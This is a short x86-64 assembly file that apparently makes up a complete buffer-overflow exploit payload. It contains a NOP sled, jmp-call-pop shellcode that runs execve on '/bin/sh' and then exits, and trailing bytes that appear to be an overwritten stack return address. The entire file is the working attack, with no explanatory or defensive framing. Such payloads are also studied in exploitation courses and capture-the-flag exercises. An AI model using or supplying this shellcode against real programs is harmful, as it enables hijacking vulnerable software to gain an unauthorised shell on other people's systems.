BITS 64

%rep 46
  nop
%endrep

jmp short shell

main:
    pop rdi
    xor eax, eax
    mov [rdi + 7], al
    mov al, 59
    xor rsi, rsi
    xor rdx, rdx
    xor rcx, rcx
    syscall

    xor rax, rax
    add rax, 60
    syscall

shell:
    call main
    db "/bin/sh"


db 0x58,0xea,0xff,0xff,0xff,0x7f
